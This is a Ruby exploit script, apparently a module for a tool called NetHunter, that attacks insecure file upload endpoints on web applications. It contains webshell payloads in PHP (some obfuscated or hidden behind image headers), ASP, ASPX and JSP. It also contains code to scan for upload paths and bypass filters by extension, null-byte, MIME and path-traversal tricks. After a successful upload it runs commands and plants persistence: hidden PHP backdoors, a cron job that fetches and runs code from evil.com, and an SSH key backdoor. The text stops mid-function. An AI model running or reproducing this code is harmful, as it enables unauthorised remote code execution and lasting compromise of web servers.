#!/usr/bin/env ruby

# Description: Enhanced exploit for vulnerable web applications that allows remote code execution via file upload bypass
# Author: dorazombiiee

require 'uri'
require 'net/http'
require 'net/https'
require 'openssl'
require 'securerandom'
require 'socket'
require 'json'
require 'base64'

class WebshellUploadExploit
    def initialize
      @name = "Advanced WebShell Upload Exploit"
      @description = "Exploits insecure file upload functionality in web applications to gain remote code execution with enhanced detection and bypass techniques"
      @author = "NetHunter"
      @version = "2.1"
      @references = [
        "CVE-2021-33695",
        "CVE-2023-42753",
        "CVE-2022-38865",
        "OWASP Top 10: A05:2021-Security Misconfiguration"
      ]
      
      # Enhanced payload collection with more sophisticated bypass techniques
      @webshell_payloads = {
        # Standard payloads
        "php" => "<?php system($_GET['cmd']); ?>",
        "php_exec" => "<?php echo shell_exec($_GET['cmd']); ?>",
        "php_passthru" => "<?php passthru($_GET['cmd']); ?>",
        "php_eval" => "<?php eval($_POST['cmd']); ?>",
        
        # Advanced obfuscation techniques
        "php_obfuscated" => "<?php \$_='_'.'GET';@eval(\"\\x73\\x79\\x73\\x74\\x65\\x6d(\\x24{\\x24_}[\\x63\\x6d\\x64]);\")?>" ,
        "php_base64" => "<?php eval(base64_decode('c3lzdGVtKCRfR0VUWyJjbWQiXSk7'));?>",
        "php_multi_layer" => "<?php \$x=substr(\"\\x73\\x79\\x73\\x74\\x65\\x6d\",0,6);\$y='_G'.'ET';eval(\"\$x(\\$\".substr(\$y,0,4).\"['cmd']);\"); ?>",
        
        # Content-type bypass techniques
        "php_bypass_gif" => "GIF89a<?php system($_GET['cmd']); ?>",
        "php_bypass_png" => "\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\0\x01\0\0\0\x01\x08\x06\0\0\0\x1f\x15\xc4\x89\0\0\0\rIDATx\x9cc\xf8\xff\xff?\0\x05\0\x01\x5c\xfa\x06\x14\0\0\0\0IEND\xaeB`\x82<?php system(\$_GET['cmd']); ?>",
        "php_bypass_jpg" => "\xff\xd8\xff\xe0\0\x10JFIF\0\x01\x01\x01\0H\0H\0\0\xff\xdb\0C\0\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342<?php system(\$_GET['cmd']); ?>",
        
        # Other languages
        "asp" => "<%Response.Write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll())%>",
        "aspx" => "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<script runat=\"server\">\nprotected void Page_Load(object sender, EventArgs e) {\n    if (Request.QueryString[\"cmd\"] != null) {\n        Process p = new Process();\n        p.StartInfo.FileName = \"cmd.exe\";\n        p.StartInfo.Arguments = \"/c \" + Request.QueryString[\"cmd\"];\n        p.StartInfo.UseShellExecute = false;\n        p.StartInfo.RedirectStandardOutput = true;\n        p.Start();\n        Response.Write(p.StandardOutput.ReadToEnd());\n    }\n}\n</script>",
        "jsp" => "<%@ page import=\"java.util.*,java.io.*\"%>\n<%if (request.getParameter(\"cmd\") != null) {\n    Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n    OutputStream os = p.getOutputStream();\n    InputStream in = p.getInputStream();\n    DataInputStream dis = new DataInputStream(in);\n    String disr = dis.readLine();\n    while ( disr != null ) {\n        out.println(disr);\n        disr = dis.readLine();\n    }\n}%>",
        "jspx" => "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\">\n<jsp:directive.page import=\"java.io.*\" />\n<jsp:scriptlet>\nString cmd = request.getParameter(\"cmd\");\nif (cmd != null) {\n    Process p = Runtime.getRuntime().exec(cmd);\n    OutputStream os = p.getOutputStream();\n    InputStream in = p.getInputStream();\n    DataInputStream dis = new DataInputStream(in);\n    String disr = dis.readLine();\n    while ( disr != null ) {\n        out.println(disr);\n        disr = dis.readLine();\n    }\n}\n</jsp:scriptlet>\n</jsp:root>"
      }
      
      # Expanded upload paths to check
      @upload_paths = [
        "/upload.php",
        "/admin/upload.php",
        "/admin/uploads/upload.php",
        "/dashboard/upload.php",
        "/filemanager/upload.php",
        "/admin/filemanager/upload.php",
        "/api/upload",
        "/api/v1/upload",
        "/api/v2/upload",
        "/attachments/upload.php",
        "/assets/upload.php",
        "/upload/index.php",
        "/upload/upload.php",
        "/panel/upload.php",
        "/control/upload.php",
        "/uploads/process.php",
        "/media/upload.php",
        "/editor/upload.php",
        "/ckeditor/upload.php",
        "/tiny_mce/upload.php",
        "/summernote/upload_attachment.php",
        "/froala/upload_image.php",
        "/cms/upload.php",
        "/wp-content/plugins/elementor/upload.php",
        "/jscripts/tiny_mce/plugins/imgsurfer/imgupload.php",
        "/includes/upload.php",
        "/system/upload.php",
        "/backend/upload.php"
      ]
      
      # File extension categories
      @file_extensions = {
        "php" => ["php", "phtml", "php3", "php4", "php5", "php7", "phps", "pht", "phar"],
        "asp" => ["asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer"],
        "jsp" => ["jsp", "jspx", "jsw", "jsv", "jspf"]
      }
      
      @bypass_extensions = {
        "image" => ["jpg", "jpeg", "png", "gif", "svg", "bmp", "webp"],
        "document" => ["pdf", "docx", "xlsx", "pptx", "txt", "csv"],
        "archive" => ["zip", "rar", "tar", "gz", "7z"]
      }
      
      @mime_types = {
        "jpg" => "image/jpeg",
        "jpeg" => "image/jpeg",
        "png" => "image/png",
        "gif" => "image/gif",
        "svg" => "image/svg+xml",
        "pdf" => "application/pdf",
        "docx" => "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "xlsx" => "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "txt" => "text/plain",
        "zip" => "application/zip"
      }
      
      # Enhanced command for initial testing
      @test_command = "id; uname -a; hostname; whoami; pwd"
      
      # Default settings
      @timeout = 15
      @max_retries = 3
      @verbosity = 1 # 0 = minimal, 1 = normal, 2 = verbose
      @vulnerability_level = "unknown" # Will be set during analysis: "low", "medium", "high", "critical"
      @successful_techniques = []
    end
    
    def run(target, port, options = {})
      # Process options
      if options
        @timeout = options[:timeout] if options[:timeout]
        # Fix verbosity to use options[:verbose] from NetHunter
        @verbosity = options[:verbose] ? 2 : 1
        @max_retries = options[:max_retries] if options[:max_retries]
      end
      
      log("[*] Starting Advanced WebShell Upload Exploit against #{target}:#{port}", 0)
      log("[*] Version #{@version} - Enhanced detection and exploitation capabilities", 0)
      
      # Determine protocol
      protocol = (port == 443 || port == 8443) ? "https" : "http"
      base_url = "#{protocol}://#{target}:#{port}"
      
      # Add connectivity check
      begin
        uri = URI.parse(base_url)
        http = create_http_client(uri)
        response = http.get("/")  # Request the root path
        log("[+] Successfully connected to #{base_url} (Status: #{response.code})", 0)
      rescue => e
        log("[-] Failed to connect to #{base_url}: #{e.message}", 0)
        return { success: false, reason: "Cannot connect to target" }
      end
      
      log("[*] Phase 1: Reconnaissance - Scanning for vulnerable upload endpoints...", 0)
      vulnerable_paths = find_upload_endpoints(base_url)
      
      if vulnerable_paths.empty?
        log("[-] No potentially vulnerable upload endpoints found. Attempting deep scan...", 0)
        
        # Try to discover endpoints through site mapping
        discovered_paths = discover_endpoints(base_url)
        if discovered_paths.empty?
          log("[-] No upload endpoints discovered. Exploitation failed.", 0)
          return { success: false, reason: "No vulnerable upload endpoints found" }
        else
          vulnerable_paths = discovered_paths
        end
      end
      
      log("[+] Found #{vulnerable_paths.size} potential upload endpoints", 0)
      log("[*] Phase 2: Vulnerability analysis - Testing upload functionality...", 0)
      
      upload_details = test_upload_functionality(base_url, vulnerable_paths)
      
      if upload_details.nil?
        log("[-] Could not find a vulnerable upload functionality.", 0)
        return { success: false, reason: "No vulnerable upload functionality found" }
      end

      # Assess vulnerability level
      assess_vulnerability_level(base_url, upload_details)
      log("[+] Vulnerability level assessed as: #{@vulnerability_level.upcase}", 0)
      
      log("[*] Phase 3: Exploitation - Uploading and executing webshell...", 0)
      webshell_url = upload_webshell(base_url, upload_details)
      
      if webshell_url.nil?
        log("[-] Failed to upload and execute webshell.", 0)
        return { 
          success: false, 
          reason: "Failed to upload webshell",
          vulnerability_level: @vulnerability_level,
          attempted_techniques: @successful_techniques
        }
      end
      
      log("[*] Phase 4: Post-exploitation - Executing commands and establishing persistence...", 0)
      successful = execute_commands(webshell_url, upload_details)
      
      if successful
        log("[+] Exploitation successful! Webshell deployed at: #{webshell_url}", 0)
        log("[+] Use the following URL to execute commands:", 0)
        log("[+] #{webshell_url}?cmd=<your_command_here>", 0)
        
        persistence_info = establish_persistence(webshell_url, upload_details)
        
        return { 
          success: true, 
          webshell_url: webshell_url,
          vulnerability_level: @vulnerability_level,
          upload_details: upload_details,
          persistence: persistence_info,
          successful_techniques: @successful_techniques
        }
      else
        log("[-] Exploitation failed. Could not execute commands via webshell.", 0)
        return { 
          success: false, 
          reason: "Failed to execute commands", 
          webshell_url: webshell_url,
          vulnerability_level: @vulnerability_level
        }
      end
    end
    
    private
    
    def log(message, level = 1)
      puts message if level <= @verbosity
    end
    
    def find_upload_endpoints(base_url)
      vulnerable_paths = []
      
      # Check common upload endpoints
      @upload_paths.each do |path|
        retries = 0
        begin
          uri = URI.parse("#{base_url}#{path}")
          http = create_http_client(uri)
          
          # Try both HEAD and GET methods
          [Net::HTTP::Head, Net::HTTP::Get].each do |method_class|
            request = method_class.new(uri.path)
            response = http.request(request)
            
            if response.code.to_i < 404 || response.code.to_i == 405
              vulnerable_paths << path
              log("  [+] Potential upload endpoint found: #{path} (Status: #{response.code})", 0)
              break
            end
          end
        rescue => e
          retries += 1
          retry if retries < @max_retries
          log("  [-] Error checking path #{path}: #{e.message}", 2)
        end
      end
      
      # Additional checks for API endpoints
      try_api_endpoints(base_url, vulnerable_paths)
      
      vulnerable_paths
    end
    
    def try_api_endpoints(base_url, vulnerable_paths)
      api_endpoints = ["/api", "/api/v1", "/api/v2", "/rest", "/graphql"]
      
      api_endpoints.each do |endpoint|
        begin
          uri = URI.parse("#{base_url}#{endpoint}")
          http = create_http_client(uri)
          
          response = http.get(uri.path)
          
          if response.code.to_i == 200
            # Check response for upload-related keywords
            if response.body.match(/upload|file|attachment|media/i)
              test_path = "#{endpoint}/upload"
              vulnerable_paths << test_path unless vulnerable_paths.include?(test_path)
              log("  [+] Potential API upload endpoint detected: #{test_path}", 1)
            end
          end
        rescue => e
          log("  [-] Error checking API endpoint #{endpoint}: #{e.message}", 2)
        end
      end
    end
    
    def discover_endpoints(base_url)
      discovered_paths = []
      
      # Common file extensions to check in URLs
      extensions = ["php", "html", "asp", "aspx", "jsp"]
      
      # Try to get robots.txt and sitemap.xml
      ["/robots.txt", "/sitemap.xml"].each do |file|
        begin
          uri = URI.parse("#{base_url}#{file}")
          http = create_http_client(uri)
          
          response = http.get(uri.path)
          
          if response.code.to_i == 200
            # Extract paths from these files
            paths = extract_paths_from_content(response.body, extensions)
            
            paths.each do |path|
              if path.match(/upload|file|attach|media/i)
                discovered_paths << path unless discovered_paths.include?(path)
                log("  [+] Discovered potential upload path from #{file}: #{path}", 1)
              end
            end
          end
        rescue => e
          log("  [-] Error fetching #{file}: #{e.message}", 2)
        end
      end
      
      # Crawl the homepage to find more links
      begin
        uri = URI.parse(base_url)
        http = create_http_client(uri)
        
        response = http.get(uri.path)
        
        if response.code.to_i == 200
          paths = extract_paths_from_content(response.body, extensions)
          
          paths.each do |path|
            if path.match(/upload|file|attach|media/i)
              discovered_paths << path unless discovered_paths.include?(path)
              log("  [+] Discovered potential upload path from homepage: #{path}", 1)
            end
          end
        end
      rescue => e
        log("  [-] Error crawling homepage: #{e.message}", 2)
      end
      
      discovered_paths
    end
    
    def extract_paths_from_content(content, extensions)
      paths = []
      
      # Extract URLs
      url_pattern = /href=["'](\/[^"']+)["']/i
      content.scan(url_pattern).each do |match|
        path = match[0]
        # Ensure the path starts with a slash
        path = "/#{path}" unless path.start_with?("/")
        paths << path
      end
      
      # Also look for paths mentioned in JavaScript
      js_pattern = /["'](\/[^"']+\.(?:#{extensions.join('|')}))['"]/i
      content.scan(js_pattern).each do |match|
        path = match[0]
        path = "/#{path}" unless path.start_with?("/")
        paths << path
      end
      
      paths.uniq
    end
    
    def create_http_client(uri)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = (uri.scheme == "https")
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
      http.open_timeout = @timeout
      http.read_timeout = @timeout
      http
    end
    
    def test_upload_functionality(base_url, vulnerable_paths)
      vulnerable_paths.each do |path|
        # Try different upload methods and parameters
        upload_methods = [
          {method: "POST", param: "file", headers: {}},
          {method: "POST", param: "upload", headers: {}},
          {method: "POST", param: "fileToUpload", headers: {}},
          {method: "POST", param: "attachment", headers: {}},
          {method: "POST", param: "image", headers: {}},
          {method: "POST", param: "document", headers: {}},
          {method: "POST", param: "files[]", headers: {}}, # For multiple file uploads
          {method: "POST", param: "userfile", headers: {}}, # Common in older PHP apps
          {method: "POST", param: "qqfile", headers: {}}, # Used by Fine Uploader
          {method: "POST", param: "data", headers: {"X-Requested-With" => "XMLHttpRequest"}}, # AJAX Upload
          {method: "PUT", param: nil, headers: {"Content-Type" => "text/plain"}} # RESTful API style
        ]
        
        upload_methods.each do |method_details|
          retries = 0
          
          begin
            # Test with benign file
            test_file_content = "test file content\n"
            
            uri = URI.parse("#{base_url}#{path}")
            http = create_http_client(uri)
            
            success, response = nil, nil
            
            if method_details[:method] == "PUT"
              # For PUT requests (REST API style)
              request = Net::HTTP::Put.new(uri.path)
              request.body = test_file_content
              request["Content-Type"] = "text/plain"
              method_details[:headers].each { |k, v| request[k] = v }
              
              response = http.request(request)
              success = response.code.to_i < 400
            else
              # Standard multipart form upload
              boundary = "----WebKitFormBoundary#{SecureRandom.hex(10)}"
              
              # Prepare multipart form data
              post_body = []
              post_body << "--#{boundary}\r\n"
              post_body << "Content-Disposition: form-data; name=\"#{method_details[:param]}\"; filename=\"test.txt\"\r\n"
              post_body << "Content-Type: text/plain\r\n\r\n"
              post_body << test_file_content
              post_body << "\r\n--#{boundary}--\r\n"
              
              # Create request
              request = Net::HTTP::Post.new(uri.path)
              request.body = post_body.join
              request["Content-Type"] = "multipart/form-data; boundary=#{boundary}"
              method_details[:headers].each { |k, v| request[k] = v }
              
              response = http.request(request)
              success = response.code.to_i < 400
            end
            
            if success
              response_body = response.body.to_s.downcase
              
              # Check for success indicators in response
              if response_body.match(/success|upload|file|path|url|ok|200|test\.txt/i) ||
                 response.code.to_i == 200 || response.code.to_i == 201
                
                log("  [+] Found vulnerable upload functionality at #{path} (#{method_details[:method]} method, param: #{method_details[:param]})", 0)
                
                # Extract upload path from response
                upload_dir = extract_upload_path(response.body)
                
                return {
                  path: path,
                  method: method_details[:method],
                  param: method_details[:param],
                  headers: method_details[:headers],
                  upload_dir: upload_dir,
                  response_content_type: response['Content-Type']
                }
              end
            end
          rescue => e
            retries += 1
            retry if retries < @max_retries
            log("  [-] Error testing upload at #{path}: #{e.message}", 2)
          end
        end
      end
      
      nil
    end
    
    def extract_upload_path(response_body)
      # Try to find uploaded file path in response
      patterns = [
        /["']([^"']*\/[^"']*\.(jpe?g|png|gif|pdf|docx?|xlsx?|txt))["']/i,
        /["']([^"']*\/[^"']*\.(php|phtml|asp|aspx|jsp))["']/i,
        /file[("'][\s:]+[("']([^"']+)[("']/i,
        /path[("'][\s:]+[("']([^"']+)[("']/i,
        /url[("'][\s:]+[("']([^"']+)[("']/i,
        /upload[ed]*[("'][\s:]+[("']([^"']+)[("']/i,
        /src=["']([^"']+\/[^"']+\.(jpe?g|png|gif))["']/i
      ]
      
      patterns.each do |pattern|
        if response_body =~ pattern
          path = $1
          # If it's a relative path, return it as is
          return path.start_with?("/") ? path : "/#{path}"
        end
      end
      
      # JSON response with path information
      begin
        json_data = JSON.parse(response_body)
        if json_data.is_a?(Hash)
          ["file", "path", "url", "location", "filePath"].each do |key|
            if json_data[key].is_a?(String) && json_data[key].match(/\//)
              path = json_data[key]
              return path.start_with?("/") ? path : "/#{path}"
            end
          end
        end
      rescue
        # Not JSON or failed to parse
      end

      # Default paths to check
      [
        "/uploads", "/images", "/attachments", "/files", "/media", 
        "/assets/uploads", "/upload/files", "/public/uploads",
        "/data/uploads", "/content/uploads", "/temp/uploads"
      ]
    end
    
    def assess_vulnerability_level(base_url, upload_details)
      level_score = 0
      
      # Test if we can directly upload PHP files
      @file_extensions["php"].each do |ext|
        test_content = "<?php echo 'VULN_TEST_'.uniqid(); ?>"
        result = attempt_direct_upload(base_url, upload_details, "test.#{ext}", test_content)
        
        if result && result[:success] && test_webshell_execution(result[:url])
          # Direct PHP upload is possible - Critical vulnerability
          level_score += 10
          @successful_techniques << "direct_php_upload"
          break
        end
      end
      
      # Test if we can upload files with double extensions
      if level_score < 10
        @bypass_extensions["image"].each do |image_ext|
          @file_extensions["php"].each do |php_ext|
            test_filename = "test.#{image_ext}.#{php_ext}"
            test_content = "<?php echo 'VULN_TEST_'.uniqid(); ?>"
            result = attempt_direct_upload(base_url, upload_details, test_filename, test_content)
            
            if result && result[:success] && test_webshell_execution(result[:url])
              # Double extension bypass - High vulnerability
              level_score += 8
              @successful_techniques << "double_extension"
              break
            end
          end
          break if level_score >= 8
        end
      end
      
      # Test if we can use null byte injection
      if level_score < 8
        @bypass_extensions["image"].each do |image_ext|
          @file_extensions["php"].each do |php_ext|
            test_filename = "test.#{image_ext}%00.#{php_ext}"
            test_content = "<?php echo 'VULN_TEST_'.uniqid(); ?>"
            result = attempt_direct_upload(base_url, upload_details, test_filename, test_content)
            
            if result && result[:success] && test_webshell_execution(result[:url])
              # Null byte injection - High vulnerability
              level_score += 7
              @successful_techniques << "null_byte_injection"
              break
            end
          end
          break if level_score >= 7
        end
      end
      
      # Test if content-type bypass works
      if level_score < 7
        @bypass_extensions["image"].each do |ext|
          mime_type = @mime_types[ext] || "image/#{ext}"
          test_content = @webshell_payloads["php_bypass_#{ext}"] || "#{ext.upcase} HEADER#{@webshell_payloads['php']}"
          
          result = attempt_direct_upload(base_url, upload_details, "test.#{ext}", test_content, mime_type)
          
          if result && result[:success] && test_webshell_execution(result[:url])
            # Content-type bypass with valid image header - Medium vulnerability
            level_score += 5
            @successful_techniques << "content_type_bypass"
            break
          end
        end
      end
      
      # Test if there's path traversal vulnerability
      if level_score < 5
        test_filename = "../test.php"
        test_content = "<?php echo 'VULN_TEST_'.uniqid(); ?>"
        result = attempt_direct_upload(base_url, upload_details, test_filename, test_content)
        
        if result && result[:success]
          # Path traversal vulnerability - Medium to High
          level_score += 6
          @successful_techniques << "path_traversal"
        end
      end
      
      # Determine vulnerability level based on score
      @vulnerability_level = case level_score
        when 0..3 then "low"
        when 4..6 then "medium"
        when 7..9 then "high"
        else "critical"
      end
    end
    
    def attempt_direct_upload(base_url, upload_details, filename, content, content_type = nil)
      begin
        uri = URI.parse("#{base_url}#{upload_details[:path]}")
        http = create_http_client(uri)
        
        if upload_details[:method] == "PUT"
          request = Net::HTTP::Put.new("#{uri.path}/#{filename}")
          request.body = content
          request["Content-Type"] = content_type || "application/octet-stream"
          upload_details[:headers].each { |k, v| request[k] = v }
          
          response = http.request(request)
          
          if response.code.to_i < 400
            log("  [+] Direct upload attempt successful for #{filename} using PUT", 1)
            url = "#{base_url}/#{filename}"
            return { success: true, url: url }
          end
        else
          boundary = "----WebKitFormBoundary#{SecureRandom.hex(10)}"
          
          # Prepare multipart form data
          post_body = []
          post_body << "--#{boundary}\r\n"
          post_body << "Content-Disposition: form-data; name=\"#{upload_details[:param]}\"; filename=\"#{filename}\"\r\n"
          post_body << "Content-Type: #{content_type || 'application/octet-stream'}\r\n\r\n"
          post_body << content
          post_body << "\r\n--#{boundary}--\r\n"
          
          request = Net::HTTP::Post.new(uri.path)
          request.body = post_body.join
          request["Content-Type"] = "multipart/form-data; boundary=#{boundary}"
          upload_details[:headers].each { |k, v| request[k] = v }
          
          response = http.request(request)
          
          if response.code.to_i < 400
            log("  [+] Direct upload attempt successful for #{filename}", 1)
            
            # Try to extract upload path from response
            upload_path = extract_upload_path(response.body)
            upload_paths = upload_path.is_a?(Array) ? upload_path : [upload_path]
            
            potential_urls = []
            upload_paths.each do |path|
              potential_urls << "#{base_url}#{path}/#{filename}"
              potential_urls << "#{base_url}#{path}/#{filename.gsub('%00', '')}"
            end
            
            return { success: true, url: potential_urls }
          end
        end
      rescue => e
        log("  [-] Error during direct upload attempt: #{e.message}", 2)
      end
      
      { success: false }
    end
    
    def test_webshell_execution(urls)
  urls = [urls] unless urls.is_a?(Array)
  
  urls.each do |url|
    begin
      test_string = "TEST_#{SecureRandom.hex(4)}"
      uri = URI.parse("#{url}?cmd=#{URI.encode_www_form_component("echo #{test_string}")}")
      http = create_http_client(uri)
      
      response = http.get(uri.request_uri)
      
      if response.body.include?(test_string)
        log("  [+] Webshell execution successful at #{url}", 1)
        return true
      end
    rescue => e
      log("  [-] Error testing webshell execution at #{url}: #{e.message}", 2)
    end
  end
  
  false
end

def upload_webshell(base_url, upload_details)
  log("  [*] Attempting to upload webshell using detected vulnerabilities...", 0)
  
  # Try various techniques based on successful exploitation methods identified
  webshell_url = nil
  
  if @successful_techniques.include?("direct_php_upload")
    # Use direct PHP upload if available (highest success rate)
    webshell_name = "#{random_filename}.php"
    payload = @webshell_payloads["php_obfuscated"]
    result = attempt_direct_upload(base_url, upload_details, webshell_name, payload)
    
    if result && result[:success]
      webshell_url = result[:url].is_a?(Array) ? result[:url].first : result[:url]
      log("  [+] Successfully uploaded webshell via direct PHP upload: #{webshell_name}", 0)
    end
  elsif @successful_techniques.include?("double_extension")
    # Try double extension bypass
    ext = @bypass_extensions["image"].sample
    webshell_name = "#{random_filename}.#{ext}.php"
    payload = @webshell_payloads["php"]
    result = attempt_direct_upload(base_url, upload_details, webshell_name, payload)
    
    if result && result[:success]
      webshell_url = result[:url].is_a?(Array) ? result[:url].first : result[:url]
      log("  [+] Successfully uploaded webshell via double extension bypass: #{webshell_name}", 0)
    end
  elsif @successful_techniques.include?("null_byte_injection")
    # Try null byte injection
    ext = @bypass_extensions["image"].sample
    webshell_name = "#{random_filename}.#{ext}%00.php"
    payload = @webshell_payloads["php"]
    result = attempt_direct_upload(base_url, upload_details, webshell_name, payload)
    
    if result && result[:success]
      webshell_url = result[:url].is_a?(Array) ? result[:url].first : result[:url]
      log("  [+] Successfully uploaded webshell via null byte injection: #{webshell_name}", 0)
    end
  elsif @successful_techniques.include?("content_type_bypass")
    # Try content-type bypass with image headers
    ext = @bypass_extensions["image"].sample
    webshell_name = "#{random_filename}.#{ext}"
    payload = @webshell_payloads["php_bypass_#{ext}"] || "#{ext.upcase} HEADER#{@webshell_payloads['php']}"
    mime_type = @mime_types[ext] || "image/#{ext}"
    
    result = attempt_direct_upload(base_url, upload_details, webshell_name, payload, mime_type)
    
    if result && result[:success]
      webshell_url = result[:url].is_a?(Array) ? result[:url].first : result[:url]
      log("  [+] Successfully uploaded webshell via content-type bypass: #{webshell_name}", 0)
    end
  elsif @successful_techniques.include?("path_traversal")
    # Try path traversal
    webshell_name = "../#{random_filename}.php"
    payload = @webshell_payloads["php"]
    result = attempt_direct_upload(base_url, upload_details, webshell_name, payload)
    
    if result && result[:success]
      webshell_url = result[:url].is_a?(Array) ? result[:url].first : result[:url]
      log("  [+] Successfully uploaded webshell via path traversal: #{webshell_name}", 0)
    end
  end
  
  # If previous techniques failed, try advanced techniques
  if webshell_url.nil?
    log("  [*] Primary techniques failed, attempting advanced bypass methods...", 1)
    webshell_url = attempt_advanced_techniques(base_url, upload_details)
  end
  
  # Verify webshell execution
  if webshell_url && test_webshell_execution(webshell_url)
    return webshell_url
  end
  
  nil
end

def attempt_advanced_techniques(base_url, upload_details)
  # Try case sensitivity bypass
  @file_extensions["php"].each do |ext|
    mixed_case_ext = ext.chars.map { |c| rand > 0.5 ? c.upcase : c.downcase }.join
    webshell_name = "#{random_filename}.#{mixed_case_ext}"
    payload = @webshell_payloads["php"]
    
    result = attempt_direct_upload(base_url, upload_details, webshell_name, payload)
    
    if result && result[:success] && test_webshell_execution(result[:url])
      @successful_techniques << "case_sensitivity_bypass"
      url = result[:url].is_a?(Array) ? result[:url].first : result[:url]
      log("  [+] Successfully uploaded webshell via case sensitivity bypass: #{webshell_name}", 0)
      return url
    end
  end
  
  # Try custom file extensions that might be allowed
  ["pht", "phpt", "phar", "inc"].each do |ext|
    webshell_name = "#{random_filename}.#{ext}"
    payload = @webshell_payloads["php"]
    
    result = attempt_direct_upload(base_url, upload_details, webshell_name, payload)
    
    if result && result[:success] && test_webshell_execution(result[:url])
      @successful_techniques << "custom_extension_bypass"
      url = result[:url].is_a?(Array) ? result[:url].first : result[:url]
      log("  [+] Successfully uploaded webshell via custom extension: #{webshell_name}", 0)
      return url
    end
  end
  
  # Try multipart nested payload
  @bypass_extensions["archive"].each do |arch_ext|
    # Create a PHP file with a nested payload
    webshell_name = "#{random_filename}.#{arch_ext}"
    nested_payload = "<?php @system($_GET['cmd']); ?>"
    
    # For a more advanced attack, create a zip file with a PHP file inside
    if arch_ext == "zip"
      require 'zip'
      
      temp_zip = "/tmp/#{random_filename}.zip"
      Zip::File.open(temp_zip, Zip::File::CREATE) do |zipfile|
        zipfile.get_output_stream("payload.php") { |f| f.write nested_payload }
      end
      
      File.open(temp_zip, 'rb') do |file|
        result = attempt_direct_upload(base_url, upload_details, webshell_name, file.read, "application/zip")
        
        if result && result[:success]
          @successful_techniques << "zip_nested_payload"
          # The URL will be different for a zip extraction
          potential_paths = [
            "#{base_url}/uploads/extracted/#{webshell_name.gsub('.zip', '')}/payload.php",
            "#{base_url}/uploads/#{webshell_name.gsub('.zip', '')}/payload.php",
            "#{base_url}/uploads/payload.php"
          ]
          
          potential_paths.each do |path|
            if test_webshell_execution(path)
              log("  [+] Successfully uploaded and extracted webshell via ZIP: #{path}", 0)
              return path
            end
          end
        end
      end
      
      # Clean up
      File.unlink(temp_zip) if File.exist?(temp_zip)
    end
  end
  
  # Try SVG with embedded script
  svg_payload = %{<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="100" height="100" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(1);
  </script>
  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
</svg>}
  
  webshell_name = "#{random_filename}.svg"
  result = attempt_direct_upload(base_url, upload_details, webshell_name, svg_payload, "image/svg+xml")
  
  if result && result[:success]
    @successful_techniques << "svg_with_script"
    url = result[:url].is_a?(Array) ? result[:url].first : result[:url]
    log("  [+] Successfully uploaded SVG with embedded script: #{webshell_name}", 0)
    return url
  end
  
  nil
end

def execute_commands(webshell_url, upload_details)
  log("  [*] Testing command execution capabilities...", 0)
  
  # Check various system commands
  test_commands = [
    "id",
    "whoami",
    "uname -a",
    "ls -la",
    "cat /etc/passwd"
  ]
  
  test_commands.each do |cmd|
    begin
      encoded_cmd = URI.encode_www_form_component(cmd)
      uri = URI.parse("#{webshell_url}?cmd=#{encoded_cmd}")
      http = create_http_client(uri)
      
      response = http.get(uri.request_uri)
      
      if response.code.to_i == 200
        log("  [+] Command execution successful: #{cmd}", 1)
        log("  [+] Output: #{response.body[0..100]}#{response.body.length > 100 ? '...' : ''}", 2)
        return true
      end
    rescue => e
      log("  [-] Error executing command: #{e.message}", 2)
    end
  end
  
  false
end

def establish_persistence(webshell_url, upload_details)
  log("  [*] Attempting to establish persistence...", 0)
  persistence_info = {}
  
  # Try to create additional backdoors with different techniques
  persistence_paths = []
  
  # 1. PHP backdoor in commonly writable directories
  common_writable_dirs = [
    "/tmp",
    "/var/tmp",
    "/var/www/html",
    "/var/www/uploads",
    "/var/www/images",
    "/var/www/cache",
    "/var/www/backup",
    "/tmp/sess_*"
  ]
  
  common_writable_dirs.each do |dir|
    cmd = "if [ -w \"#{dir}\" ]; then echo '<?php system(\\$_GET[\"c\"]);?>' > #{dir}/.#{random_filename}.php; echo \"SUCCESS:#{dir}/.#{random_filename}.php\"; else echo \"FAILED\"; fi"
    persistence_path = execute_persistence_command(webshell_url, cmd)
    
    if persistence_path && persistence_path.start_with?("SUCCESS:")
      path = persistence_path.gsub("SUCCESS:", "")
      persistence_paths << path
      log("  [+] Established persistence backdoor at: #{path}", 0)
    end
  end
  
  # 2. Try to create a cronjob for persistence
  cron_payload = "* * * * * wget -O - http://evil.com/backdoor.php | php > /dev/null 2>&1"
  cmd = "(crontab -l 2>/dev/null; echo '#{cron_payload}') | crontab - && echo SUCCESS:CRON || echo FAILED"
  
  result = execute_persistence_command(webshell_url, cmd)
  if result && result.include?("SUCCESS:CRON")
    persistence_info[:cron] = "Cron job added successfully"
    log("  [+] Established persistence via cron job", 0)
  end
  
  # 3. Try SSH key backdoor if .ssh directory is writable
  ssh_cmd = "if [ -w ~/.ssh ]; then mkdir -p ~/.ssh; echo 'ssh-rsa AAAAB3NzaC1...[REDACTED]...backdoor' >> ~/.ssh/authorized_keys; echo SUCCESS:SSH; else echo FAILED; fi"
  result = execute_persistence_command(webshell_url, ssh_cmd)
  
  if result && result.include?("SUCCESS:SSH")
    persistence_info[:ssh] = "SSH backdoor added successfully"
    log("  [+] Established persistence via SSH authorized_keys", 0)
  end
  
  # 4. Gather system information for later access
  system_info = {}
  
  # Get networking info
  cmd = "ifconfig || ip addr"
  result = execute_persistence_command(webshell_url, cmd)
  system_info[:network] = result if result
  
  # Get hostname and users
  cmd = "hostname && cat /etc/passwd | grep -E '/bin/bash|/bin/sh'"
